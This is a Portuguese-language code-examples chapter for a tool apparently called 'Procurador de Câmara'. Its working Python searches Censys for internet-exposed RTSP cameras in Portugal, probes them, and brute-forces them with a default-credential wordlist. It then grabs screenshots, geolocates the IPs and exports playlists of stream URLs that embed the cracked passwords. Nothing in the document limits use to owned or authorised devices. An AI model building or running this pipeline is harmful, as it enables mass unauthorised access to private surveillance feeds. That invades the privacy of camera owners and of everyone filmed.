# 10 — CÓDIGO EXEMPLO

> Exemplos práticos de cada componente. Podes usar como referência direta.

---

## 10.1 Censys — Query + Parse (30 linhas)

```python
"""
Exemplo mínimo para buscar câmaras RTSP no Censys.
"""
import os
from censys.search import CensysHosts

API_ID = os.environ["CENSYS_API_ID"]
API_SECRET = os.environ["CENSYS_SECRET"]

c = CensysHosts(api_id=API_ID, api_secret=API_SECRET)

# Query: RTSP em Portugal
results = c.search(
    "services.service_name: RTSP and location.country_code: PT",
    per_page=50,
)

for host in results:
    ip = host.get("ip")
    services = host.get("services", [])
    rtsp = next((s for s in services if s.get("service_name") == "RTSP"), None)

    if rtsp:
        print(f"📹 {ip}:{rtsp.get('port')} — {rtsp.get('transport_protocol', 'N/A')}")
        print(f"   🌍 {host.get('location', {}).get('city')}, {host.get('location', {}).get('country')}")
        print(f"   🏭 Banner: {rtsp.get('http', {}).get('response', {}).get('body', 'N/A')[:80]}")
        print()
```

---

## 10.2 RTSP Probe — Socket Manual (50 linhas)

```python
"""
Exemplo completo de probe RTSP com socket puro.
"""
import socket
import base64

def probe_rtsp(ip: str, port: int = 554, timeout: int = 3, path: str = "",
               user: str = "", password: str = "") -> dict:
    """Probe RTSP: OPTIONS + DESCRIBE. Retorna dict com resposta."""
    result = {
        "ip": ip, "port": port, "path": path,
        "status_code": 0, "methods": [], "server": "",
        "sdp": "", "auth": False,
    }

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        # OPTIONS request
        req = f"OPTIONS rtsp://{ip}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        sock.send(req.encode())
        resp = sock.recv(4096).decode(errors="ignore")

        if resp.startswith("RTSP/1.0"):
            code = int(resp.split(" ")[1])
            result["status_code"] = code

            # Extrair métodos
            for line in resp.split("\r\n"):
                if line.lower().startswith("public:"):
                    result["methods"] = [m.strip() for m in line.split(":", 1)[1].split(",")]
                if line.lower().startswith("server:"):
                    result["server"] = line.split(":", 1)[1].strip()

            # DESCRIBE request
            auth_header = ""
            if user and password:
                auth = base64.b64encode(f"{user}:{password}".encode()).decode()
                auth_header = f"Authorization: Basic {auth}\r\n"

            desc = (
                f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
                f"CSeq: 2\r\n"
                f"{auth_header}"
                f"Accept: application/sdp\r\n\r\n"
            )
            sock.send(desc.encode())
            desc_resp = sock.recv(8192).decode(errors="ignore")

            if desc_resp.startswith("RTSP/1.0"):
                desc_code = int(desc_resp.split(" ")[1])
                result["status_code"] = desc_code
                result["auth"] = (desc_code == 200)
                # Extrair SDP
                if "\r\n\r\n" in desc_resp:
                    result["sdp"] = desc_resp.split("\r\n\r\n", 1)[1]

        sock.close()

    except socket.timeout:
        result["error"] = "timeout"
    except ConnectionRefusedError:
        result["error"] = "refused"
    except Exception as e:
        result["error"] = str(e)

    return result


# Teste rápido
if __name__ == "__main__":
    result = probe_rtsp("192.168.1.100", path="/Streaming/Channels/101")
    print(f"Status: {result['status_code']}")
    print(f"Methods: {result['methods']}")
    print(f"Server: {result['server']}")
    print(f"Auth: {result['auth']}")
    if result['sdp']:
        print(f"SDP:\n{result['sdp'][:200]}")
```

---

## 10.3 Brute Force — Default Creds (40 linhas)

```python
"""
Exemplo de brute force de credenciais RTSP.
"""
import base64
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

# Wordlist de credenciais genéricas
WORDLIST = [
    ("admin", "admin"), ("admin", "12345"), ("admin", "password"),
    ("admin", ""), ("admin", "1234"), ("root", "root"),
    ("root", "pass"), ("admin", "888888"), ("admin", "666666"),
    ("user", "user"), ("guest", "guest"), ("admin", "default"),
]

def try_creds(ip: str, port: int, path: str, user: str, password: str,
              timeout: int = 3) -> bool:
    """Testar um par user:pass."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        auth = base64.b64encode(f"{user}:{password}".encode()).decode()
        req = (
            f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"Authorization: Basic {auth}\r\n"
            f"Accept: application/sdp\r\n\r\n"
        )
        sock.send(req.encode())
        resp = sock.recv(4096).decode(errors="ignore")
        sock.close()

        return resp.startswith("RTSP/1.0 200")
    except:
        return False

def brute(ip: str, port: int = 554, path: str = "/live") -> tuple:
    """Brute force completo."""
    print(f"🔑 Brute: {ip}:{port}{path}")

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {
            ex.submit(try_creds, ip, port, path, u, p): (u, p)
            for u, p in WORDLIST
        }

        for f in as_completed(futures):
            u, p = futures[f]
            if f.result():
                print(f"✅ Found: {u}:{p}")
                return (u, p)

    print("❌ No creds found")
    return None


if __name__ == "__main__":
    result = brute("192.168.1.100", 554, "/Streaming/Channels/101")
    if result:
        user, password = result
        print(f"rtsp://{user}:{password}@192.168.1.100:554/Streaming/Channels/101")
```

---

## 10.4 Stream Capture — Screenshot (20 linhas)

```python
"""
Exemplo mínimo de captura de screenshot RTSP com OpenCV.
"""
import cv2
from pathlib import Path

def screenshot(rtsp_url: str, output: str = "screenshot.png") -> bool:
    """
    Capturar 1 frame de um stream RTSP.

    Args:
        rtsp_url: URL RTSP completo (ex: rtsp://admin:12345@192.168.1.100:554/live)
        output: Path para guardar o screenshot

    Returns:
        True se conseguiu capturar
    """
    cap = cv2.VideoCapture(rtsp_url)

    if not cap.isOpened():
        print(f"❌ Não conseguiu abrir: {rtsp_url}")
        return False

    ret, frame = cap.read()
    cap.release()

    if ret:
        cv2.imwrite(output, frame)
        h, w = frame.shape[:2]
        print(f"📸 Screenshot: {output} ({w}x{h})")
        return True
    else:
        print("❌ Frame vazio")
        return False


if __name__ == "__main__":
    screenshot("rtsp://admin:12345@192.168.1.100:554/Streaming/Channels/101")
```

---

## 10.5 TUI Mínima — Rich Dashboard (25 linhas)

```python
"""
Exemplo mínimo de dashboard com Rich.
"""
import time
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.text import Text
from rich.console import Console

console = Console()

def make_table(cameras: list[dict]) -> Table:
    """Criar tabela de câmaras."""
    table = Table(title="📹 Câmaras")
    table.add_column("IP", style="cyan")
    table.add_column("Fabricante", style="green")
    table.add_column("Porta", style="yellow")
    table.add_column("Status")

    for c in cameras:
        status = "🟢" if c.get("live") else "🔴"
        table.add_row(c["ip"], c.get("vendor", "?"), str(c.get("port", 554)), status)

    return table

def make_stats(cameras: list[dict]) -> Panel:
    """Painel de estatísticas."""
    total = len(cameras)
    live = sum(1 for c in cameras if c.get("live"))
    return Panel(f"📡 Total: {total}  🟢 Live: {live}  🔴 Off: {total - live}",
                 style="cyan")

# Dados de exemplo
cameras = [
    {"ip": "192.168.1.100", "vendor": "Hikvision", "port": 554, "live": True},
    {"ip": "192.168.1.101", "vendor": "Dahua", "port": 554, "live": True},
    {"ip": "85.242.1.1", "vendor": "Axis", "port": 554, "live": False},
]

# Live update
with Live(refresh_per_second=2, screen=True) as live:
    for i in range(10):
        layout = Layout()
        layout.split_column(
            Layout(make_stats(cameras), size=3),
            Layout(make_table(cameras)),
        )
        live.update(layout)
        time.sleep(1)
```

---

## 10.6 Web Mínimo — Flask Dashboard (30 linhas)

```python
"""
Exemplo mínimo de web dashboard com Flask.
"""
from flask import Flask, render_template_string, jsonify

app = Flask(__name__)

# Dados de exemplo
cameras = [
    {"ip": "192.168.1.100", "vendor": "Hikvision", "port": 554, "live": True, "resolution": "1920x1080"},
    {"ip": "192.168.1.101", "vendor": "Dahua", "port": 554, "live": True, "resolution": "1280x720"},
    {"ip": "85.242.1.1", "vendor": "Axis", "port": 554, "live": False, "resolution": "N/A"},
]

TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>📹 Procurador</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white p-6">
    <h1 class="text-2xl text-cyan-400 mb-4">📹 Procurador de Câmara</h1>
    <div class="grid grid-cols-3 gap-4 mb-6">
        <div class="bg-gray-800 p-4 rounded">
            <div class="text-3xl text-cyan-400">{{ stats.total }}</div>
            <div class="text-gray-400">📡 Total</div>
        </div>
        <div class="bg-gray-800 p-4 rounded">
            <div class="text-3xl text-green-400">{{ stats.live }}</div>
            <div class="text-gray-400">🟢 Live</div>
        </div>
        <div class="bg-gray-800 p-4 rounded">
            <div class="text-3xl text-red-400">{{ stats.off }}</div>
            <div class="text-gray-400">🔴 Off</div>
        </div>
    </div>
    <table class="w-full">
        <thead>
            <tr class="text-gray-400 border-b">
                <th class="p-2 text-left">IP</th>
                <th class="p-2 text-left">Fabricante</th>
                <th class="p-2 text-left">Porta</th>
                <th class="p-2 text-left">Resolução</th>
                <th class="p-2 text-left">Status</th>
            </tr>
        </thead>
        <tbody>
            {% for c in cameras %}
            <tr class="border-b border-gray-800">
                <td class="p-2 font-mono">{{ c.ip }}</td>
                <td class="p-2">{{ c.vendor }}</td>
                <td class="p-2">{{ c.port }}</td>
                <td class="p-2">{{ c.resolution }}</td>
                <td class="p-2">{{ '🟢 Live' if c.live else '🔴 Off' }}</td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
</body>
</html>
"""

@app.route("/")
def index():
    stats = {
        "total": len(cameras),
        "live": sum(1 for c in cameras if c["live"]),
        "off": sum(1 for c in cameras if not c["live"]),
    }
    return render_template_string(TEMPLATE, cameras=cameras, stats=stats)

@app.route("/api")
def api():
    return jsonify(cameras)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
```

---

## 10.7 GeoIP — ipinfo.io (15 linhas)

```python
"""
Exemplo mínimo de resolução GeoIP com ipinfo.io.
"""
import os
import requests

TOKEN = os.environ.get("IPINFO_TOKEN", "")

def geoip(ip: str) -> dict:
    """Resolver localização de um IP."""
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}?token={TOKEN}", timeout=5)
        data = resp.json()
        return {
            "ip": ip,
            "city": data.get("city", "?"),
            "country": data.get("country", "?"),
            "loc": data.get("loc", "?"),
            "org": data.get("org", "?"),
            "hostname": data.get("hostname", ""),
        }
    except Exception as e:
        return {"ip": ip, "error": str(e)}


if __name__ == "__main__":
    info = geoip("8.8.8.8")
    print(f"📍 {info['ip']} → {info['city']}, {info['country']}")
    print(f"   🏢 {info['org']}")
```

---

## 10.8 Scan Local — ARP + ONVIF (30 linhas)

```python
"""
Exemplo mínimo de scan local: ARP + ONVIF.
"""
import subprocess
import json

def arp_scan(subnet: str = "192.168.1.0/24") -> list[dict]:
    """
    ARP scan com scapy.

    Fallback: usar `arp -a` se scapy não estiver disponível.
    """
    try:
        from scapy.all import ARP, Ether, srp
        arp = ARP(pdst=subnet)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        result = srp(ether / arp, timeout=3, verbose=0)[0]

        hosts = []
        for sent, received in result:
            hosts.append({"ip": received.psrc, "mac": received.hwsrc})
        return hosts

    except ImportError:
        # Fallback: arp -a
        output = subprocess.run(["arp", "-a"], capture_output=True, text=True).stdout
        hosts = []
        for line in output.split("\n"):
            parts = line.split()
            if len(parts) >= 2 and parts[0].count(".") == 3:
                hosts.append({"ip": parts[0], "mac": parts[1] if len(parts) > 1 else ""})
        return hosts

def onvif_discover(timeout: int = 4) -> list[dict]:
    """WS-Discovery para ONVIF."""
    try:
        from wsdiscovery import WSDiscovery
        wsd = WSDiscovery()
        wsd.start()
        services = wsd.searchServices(timeout=timeout)
        devices = []
        for svc in services:
            for addr in svc.getXAddrs():
                devices.append({"url": addr, "types": [str(t) for t in svc.getTypes()]})
        wsd.stop()
        return devices
    except ImportError:
        print("⚠️  WSDiscovery não instalado (pip install WSDiscovery)")
        return []


if __name__ == "__main__":
    print("📡 ARP scan...")
    hosts = arp_scan()
    print(f"   {len(hosts)} hosts encontrados")

    print("📡 ONVIF discover...")
    onvif = onvif_discover()
    print(f"   {len(onvif)} dispositivos ONVIF")
```

---

## 10.9 Export — Playlist M3U (15 linhas)

```python
"""
Exemplo: gerar playlist .m3u para VLC.
"""
from datetime import datetime

def export_m3u(cameras: list[dict], filename: str = "streams.m3u"):
    """Gerar playlist M3U."""
    lines = ["#EXTM3U"]
    lines.append(f"#PLAYLIST: Procurador — {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    lines.append("")

    for cam in cameras:
        name = f"{cam.get('vendor', 'Cam')} - {cam['ip']}"
        url = cam.get("rtsp_url")
        if url:
            lines.append(f"#EXTINF:-1,📹 {name}")
            lines.append(url)
            lines.append("")

    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    print(f"📤 {filename} — {len(cameras)} streams")


if __name__ == "__main__":
    cameras = [
        {"ip": "192.168.1.100", "vendor": "Hikvision",
         "rtsp_url": "rtsp://admin:12345@192.168.1.100:554/Streaming/Channels/101"},
    ]
    export_m3u(cameras)
```

---

## 10.10 Config Loader (20 linhas)

```python
"""
Exemplo: loader de configuração TOML + env vars.
"""
import os
import tomllib
from dataclasses import dataclass
from pathlib import Path


@dataclass
class Config:
    censys_query: str = "services.service_name: RTSP"
    censys_pages: int = 5
    censys_country: str = ""
    rtsp_timeout: int = 3
    rtsp_concurrent: int = 200
    brute_enabled: bool = True
    debug: bool = False

    @property
    def censys_api_id(self) -> str:
        return os.environ.get("CENSYS_API_ID", "")

    @property
    def censys_secret(self) -> str:
        return os.environ.get("CENSYS_SECRET", "")

    @property
    def ipinfo_token(self) -> str:
        return os.environ.get("IPINFO_TOKEN", "")


def load_config(path: str = "config.toml") -> Config:
    """Carregar config de ficheiro TOML."""
    config = Config()

    config_path = Path(path)
    if config_path.exists():
        with open(config_path, "rb") as f:
            data = tomllib.load(f)

        censys = data.get("censys", {})
        config.censys_query = censys.get("default_query", config.censys_query)
        config.censys_pages = censys.get("max_pages", config.censys_pages)

        scan = data.get("scan", {})
        config.rtsp_timeout = scan.get("rtsp_probe_timeout", config.rtsp_timeout)

    return config
```

---

> Seguir para o documento 11 — CHECKLIST FINAL
